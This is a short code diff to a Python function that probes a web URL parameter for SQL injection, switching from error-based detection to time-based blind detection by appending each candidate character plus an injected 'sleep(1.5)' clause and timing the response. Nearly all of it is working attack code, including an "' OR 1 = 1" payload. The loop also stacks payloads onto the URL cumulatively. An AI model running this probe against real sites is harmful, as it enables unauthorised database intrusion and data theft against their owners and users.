@@ -8,12 +8,12 @@ def escape(url,param,list = ["\\",",","'","#","/",'"','.',"' OR 1 = 1"]) :      
     char = []
     print("Trying to break the query...")
     for i in list:
-        url = url+param+"=1"+i
-        print(url)
+        url = url+param+"=1"+i+" and sleep(1.5); --+"
+        print(i)
         r=requests.get(url)
-        if "syntax" in (str(r.content)):
+        t = r.elapsed.total_seconds()
+        if t > 1.5 :
             char.append(i)
-
 
     if not char : #checks if the char array is empty or not
         print("No possible characters found.")
